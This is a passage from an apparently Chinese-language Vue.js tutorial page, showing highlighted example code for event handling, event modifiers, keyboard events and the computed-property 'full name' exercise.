class="comment">&lt;!--简写--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo1&quot;</span>&gt;</span>点我提示信息1(不传参)<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo2($event,15,user,&#x27;祝你玩得开心！&#x27;)&quot;</span>&gt;</span>点我提示信息2(传参)<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">user:<span class="string">&#x27;小明&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo1</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(event.target.innerText)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(this)//此处this是vm</span></span></span><br><span class="line"><span class="javascript">alert(<span class="string">&#x27;同学你好1！&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo2</span>(<span class="params">event,number,userName,info</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(event.target.innerText)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(this)//此处this是vm</span></span></span><br><span class="line"><span class="javascript">alert(number+<span class="string">&#x27;号，&#x27;</span>+userName+<span class="string">&#x27;同学你好！&#x27;</span>+info)</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(event)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="9-事件修饰符"><a href="#9-事件修饰符" class="headerlink" title="9.事件修饰符"></a>9.事件修饰符</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>事件修饰符<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">*&#123;</span><br><span class="line"><span class="css"><span class="attribute">margin-top</span>: <span class="number">15px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line">.demo1&#123;</span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line">&#125;</span><br><span class="line">.box1&#123;</span><br><span class="line"><span class="css"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: skyblue;</span></span><br><span class="line">&#125;</span><br><span class="line">.box2&#123;</span><br><span class="line"><span class="css"><span class="attribute">padding</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: orange;</span></span><br><span class="line">&#125;</span><br><span class="line">.list&#123;</span><br><span class="line"><span class="css"><span class="attribute">width</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: orangered;</span></span><br><span class="line"><span class="css"><span class="attribute">overflow</span>: auto;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-tag">li</span>&#123;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Vue中的事件修饰符：</span></span><br><span class="line"><span class="comment">1.prevent：阻止默认事件（常用）；</span></span><br><span class="line"><span class="comment">2.stop：阻止事件冒泡（常用）；</span></span><br><span class="line"><span class="comment">3.once：事件只触发一次（常用）；</span></span><br><span class="line"><span class="comment">4.capture：使用事件的捕获模式；</span></span><br><span class="line"><span class="comment">5.self：只有event.target是当前操作的元素时才触发事件；</span></span><br><span class="line"><span class="comment">6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--阻止默认事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> @<span class="attr">click.prevent</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--阻止事件冒泡--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.stop</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--事件只触发一次--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--使用事件的捕获模式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box1&quot;</span> @<span class="attr">click.capture</span>=<span class="string">&quot;showMsg(1)&quot;</span>&gt;</span></span><br><span class="line">div1</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box2&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showMsg(2)&quot;</span>&gt;</span></span><br><span class="line">div2</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--只有event.target是当前操作的元素时才触发事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click.self</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--事件的默认行为立即执行，无需等待事件回调执行完毕--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--@wheel：滚轮滚动事件；@scroll：滚动条滚动事件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> @<span class="attr">wheel.passive</span>=<span class="string">&quot;demo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--先阻止事件冒泡，再阻止默认事件(修饰符可以连着写)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;demo1&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.baidu.com&quot;</span> @<span class="attr">click.stop.prevent</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span>点我提示信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo</span>(<span class="params">event</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//原生js中的方法</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//event.preventDefault()阻止默认事件</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//event.stopPropagation()阻止事件冒泡</span></span></span><br><span class="line"><span class="javascript">alert(<span class="string">&#x27;同学你好！&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(event.target)//(只有event.target是当前操作的元素时才触发事件)的案例调用</span></span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showMsg</span>(<span class="params">msg</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(msg+<span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">20000</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;#&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;累坏了&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="10-键盘事件"><a href="#10-键盘事件" class="headerlink" title="10.键盘事件"></a>10.键盘事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>键盘事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1.Vue中常用的按键别名：</span></span><br><span class="line"><span class="comment">回车 =&gt; enter</span></span><br><span class="line"><span class="comment">删除 =&gt; delete</span></span><br><span class="line"><span class="comment">退出 =&gt; esc</span></span><br><span class="line"><span class="comment">空格 =&gt; space</span></span><br><span class="line"><span class="comment">换行 =&gt; tab (特殊，必须配个@keydown使用)</span></span><br><span class="line"><span class="comment">上 =&gt; up</span></span><br><span class="line"><span class="comment">下 =&gt; down</span></span><br><span class="line"><span class="comment">左 =&gt; left</span></span><br><span class="line"><span class="comment">右 =&gt; right</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.Vue中未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为keybab-case（短横线命名）</span></span><br><span class="line"><span class="comment">3.系统修饰键（用法特殊）：Ctrl、alt、shift、meta</span></span><br><span class="line"><span class="comment">（1）.配合keyup使用：按下修饰键的同时，在按下其他键，随后释放其他键，事件才被触发。</span></span><br><span class="line"><span class="comment">（2）.配合keydown使用：正常触发事件。</span></span><br><span class="line"><span class="comment">4.也可以使用keycode去指定具体的按键（不推荐）</span></span><br><span class="line"><span class="comment">5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;学习<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.enter=&quot;showInfo&quot;&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;input type=&quot;text&quot; placeholder=&quot;按下回车提示输入&quot; @keyup.caps-lock=&quot;showInfo&quot;&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;按下回车提示输入&quot;</span> @<span class="attr">keydown.tab</span>=<span class="string">&quot;showInfo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">name:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">showInfo</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(e.target.value)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="11-计算属性—姓名案例（插值语法实现）"><a href="#11-计算属性—姓名案例（插值语法实现）" class="headerlink" title="11.计算属性—姓名案例（插值语法实现）"></a>11.计算属性—姓名案例（插值语法实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（插值语法实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;firstName.slice(0,3)&#125;&#125;-&#123;&#123;lastName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="12-计算属性—姓名案例（methods实现）"><a href="#12-计算属性—姓名案例（methods实现）" class="headerlink" title="12.计算属性—姓名案例（methods实现）"></a>12.计算属性—姓名案例（methods实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（methods实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName()&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">fullName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13-计算属性—姓名案例（计算属性实现）"><a href="#13-计算属性—姓名案例（计算属性实现）" class="headerlink" title="13.计算属性—姓名案例（计算属性实现）"></a>13.计算属性—姓名案例（计算属性实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（计算属性实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">计算属性：</span></span><br><span class="line"><span class="comment">1.定义：要用的属性不存在，要通过已有的属性计算得来。</span></span><br><span class="line"><span class="comment">2.原理：底层借助了Object.defineproperty方法提供的getter和setter。</span></span><br><span class="line"><span class="comment">3.get函数什么时候执行？</span></span><br><span class="line"><span class="comment">(1).初次读取fullName时。</span></span><br><span class="line"><span class="comment">(2).所依赖的数据发生改变时。</span></span><br><span class="line"><span class="comment">4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。</span></span><br><span class="line"><span class="comment">5.备注：</span></span><br><span class="line"><span class="comment">(1).计算属性最终出现在vm上，直接读取使用即可。</span></span><br><span class="line"><span class="comment">(2).如果计算属性要修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//完整写法</span></span></span><br><span class="line">fullName:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//当有人读取fullName属性时，就会调用get()，且返回值作为fullName的属性值</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//get()调用的时机：1.初次读取fullName时。2.所依赖的数据发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//set()调用的时机：1.当fullName被修改时时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = value.split(<span class="string">&#x27;-&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.firstName = arr[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.lastName = arr[<span class="number">1</span>]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//简写（如果只有get方法时才可以这样写）</span></span></span><br><span class="line">/*fullName()&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span 